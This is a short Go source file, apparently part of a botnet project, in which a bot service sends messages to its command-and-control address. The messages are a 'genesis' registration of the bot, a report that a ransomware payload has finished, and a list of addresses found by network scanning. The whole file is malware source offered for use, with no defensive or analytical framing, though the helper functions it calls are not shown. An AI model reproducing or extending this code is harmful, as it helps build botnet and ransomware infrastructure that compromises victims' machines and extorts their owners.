package tcp

import (
	"github.com/threeaccents/botnet"
	"github.com/threeaccents/botnet/libs/bytesutil"
)

//RansomCompleteCmd is
func (b *BotService) RansomCompleteCmd(payload []byte) error {
	return sendData(b.Bot.CCAddr, payload)
}

//GenesisCmd is
func (b *BotService) GenesisCmd(bot *botnet.Bot) error {
	buff, err := bot.Bytes()
	if err != nil {
		return err
	}

	data := append(commandToBytes("genesis"), buff...)

	return sendData(b.Bot.CCAddr, data)
}

//ScanResponseCmd is
func (b *BotService) ScanResponseCmd(addrs []string) error {
	req := scanResponse{addrs}

	buff, err := bytesutil.Marshal(req)
	if err != nil {
		return err
	}

	payload := append(commandToBytes("scanresp"), buff...)

	return sendData(b.Bot.CCAddr, payload)
}
